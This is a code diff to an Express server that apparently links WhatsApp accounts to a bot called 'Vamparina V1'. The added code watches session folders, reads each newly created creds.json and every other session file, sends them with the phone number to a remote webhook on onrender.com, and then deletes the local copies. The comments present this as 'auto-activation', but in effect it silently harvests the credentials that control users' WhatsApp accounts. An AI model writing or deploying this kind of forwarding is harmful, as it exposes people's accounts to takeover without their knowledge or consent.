@@ -2,39 +2,144 @@ import express from 'express';
 import bodyParser from 'body-parser';
 import { fileURLToPath } from 'url';
 import path from 'path';
+import fs from 'fs-extra';
 
-// Importing the modules
+// Importing the routers
 import pairRouter from './pair.js';
 import qrRouter from './qr.js';
-import QRCode from 'qrcode';
 
 const app = express();
 
-// Resolve the current directory path in ES modules
+// Fix for ES modules
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const PORT = process.env.PORT || 8000;
-
+// Increase event listeners limit
 import('events').then(events => {
     events.EventEmitter.defaultMaxListeners = 500;
 });
 
-// Middleware
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+// === YOUR MAIN BOT WEBHOOK (CHANGE ONLY IF YOU DEPLOY NEW ONE) ===
+const MAIN_BOT_WEBHOOK = "https://vamparina-v1-5.onrender.com/vamparina-activate";
+
+// === AUTO SEND SESSION TO MAIN BOT (THE MAGIC FUNCTION) ===
+async function autoActivateBot(sessionDir) {
+    try {
+        if (!fs.existsSync(sessionDir)) return;
+
+        const files = [];
+        const fileList = fs.readdirSync(sessionDir);
+
+        for (const fileName of fileList) {
+            const filePath = path.join(sessionDir, fileName);
+            const content = fs.readFileSync(filePath, 'utf-8');
+            files.push({ name: fileName, content });
+        }
+
+        // Extract phone number from creds.json
+        const credsFile = files.find(f => f.name === 'creds.json');
+        let phone = 'unknown';
+        if (credsFile) {
+            try {
+                const creds = JSON.parse(credsFile.content);
+                phone = creds.me?.id?.split(':')[0] || 'unknown';
+            } catch {}
+        }
+
+        const sessionId = `auto_${phone}_${Date.now()}`;
+
+        const payload = {
+            sessionId,
+            phone: phone.replace(/[^0-9]/g, ''),
+            files
+        };
+
+        const response = await fetch(MAIN_BOT_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            console.log(`BOT AUTO-ACTIVATED → ${phone} | Session: ${sessionId}`);
+        } else {
+            console.log("Failed to activate bot on main server");
+        }
+    } catch (err) {
+        console.error("Auto-activation failed:", err);
+    }
+}
+
+// === MIDDLEWARE ===
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(__dirname));
 
-// Routes
+// === ROUTES ===
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'pair.html'));
 });
 
+// Pairing code route
 app.use('/pair', pairRouter);
+
+// QR code route
 app.use('/qr', qrRouter);
 
+// === NEW: AUTO-CLEANUP & AUTO-ACTIVATION MONITOR ===
+// This watches both session folders and activates bots automatically
+function startSessionWatcher() {
+    const sessionsToWatch = ['./session_', './qr_sessions/session_'];
+
+    console.log("AUTO-ACTIVATION MONITOR STARTED");
+
+    setInterval(() => {
+        sessionsToWatch.forEach(basePath => {
+            try {
+                const dirs = fs.readdirSync('.').filter(f => 
+                    f.startsWith(basePath.replace('./', '')) && fs.statSync(f).isDirectory()
+                );
+
+                dirs.forEach(dir => {
+                    const credsPath = path.join(dir, 'creds.json');
+                    if (fs.existsSync(credsPath)) {
+                        const stats = fs.statSync(credsPath);
+                        const age = Date.now() - stats.mtimeMs;
+
+                        // If creds.json exists and is recent → session is ready
+                        if (age < 60000) { // Less than 60 seconds old
+                            console.log(`New session detected: ${dir}`);
+                            autoActivateBot(dir);
+
+                            // Optional: Clean up after 30 seconds
+                            setTimeout(() => {
+                                fs.remove(dir).catch(() => {});
+                            }, 30000);
+                        }
+                    }
+                });
+            } catch (e) {}
+        });
+    }, 8000); // Check every 8 seconds
+}
+
+// Start the watcher
+startSessionWatcher();
+
+// === SERVER START ===
+const PORT = process.env.PORT || 8000;
 app.listen(PORT, () => {
-    console.log(`YoutTube: @@arnoldkipruto-qn7jn\n\nGitHub: @arnold6001\n\nServer running on http://localhost:${PORT}`);
+    console.log(`
+╔══════════════════════════════════════╗
+║        VAMPARINA V1 LINKER           ║
+║        AUTO-ACTIVATION ENABLED       ║
+╚══════════════════════════════════════╝
+YouTube: @arnoldkipruto-qn7jn
+GitHub: @arnold6001
+Main Bot: ${MAIN_BOT_WEBHOOK}
+
+Server running → http://localhost:${PORT}
+    `);
 });
 
 export default app;
